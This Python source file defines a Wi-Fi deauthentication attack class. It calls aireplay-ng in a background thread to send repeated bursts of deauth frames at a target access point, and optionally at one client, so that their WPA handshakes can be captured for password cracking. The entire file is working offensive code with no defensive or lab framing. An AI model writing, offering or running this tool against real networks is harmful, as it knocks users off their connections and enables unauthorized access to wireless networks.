#!/usr/bin/env python3
"""
Deauthentication Attacker
Send deauth packets to force handshake capture
"""

import subprocess
import threading
import time
from typing import Optional

class DeauthAttacker:
    """Send deauthentication packets to force client reconnection"""
    
    def __init__(self):
        self.deauth_process = None
        self.is_attacking = False
        self.attack_thread = None
        
    def start_deauth_attack(self, interface: str, target_bssid: str, 
                          client_bssid: str = None, duration: int = 30) -> threading.Thread:
        """Start deauthentication attack in separate thread"""
        
        def deauth_worker():
            self._send_deauth_packets(interface, target_bssid, client_bssid, duration)
            
        self.attack_thread = threading.Thread(target=deauth_worker)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        return self.attack_thread
    
    def _send_deauth_packets(self, interface: str, target_bssid: str, 
                           client_bssid: str, duration: int):
        """Send deauth packets using aireplay-ng"""
        try:
            self.is_attacking = True
            
            # Calculate number of deauth bursts
            bursts = max(1, duration // 10)
            
            for i in range(bursts):
                if not self.is_attacking:
                    break
                    
                cmd = ["aireplay-ng", "--deauth", "5"]
                
                if client_bssid:
                    cmd.extend(["-c", client_bssid])
                    
                cmd.extend(["-a", target_bssid, interface])
                
                print(f"⚡ Deauth burst {i+1}/{bursts}...")
                subprocess.run(cmd, capture_output=True)
                
                if i < bursts - 1:  # Don't sleep after last burst
                    time.sleep(10)
                    
        except Exception as e:
            print(f"❌ Deauth attack error: {e}")
        finally:
            self.is_attacking = False
    
    def stop_attack(self):
        """Stop deauthentication attack"""
        self.is_attacking = False
        if self.deauth_process:
            self.deauth_process.terminate()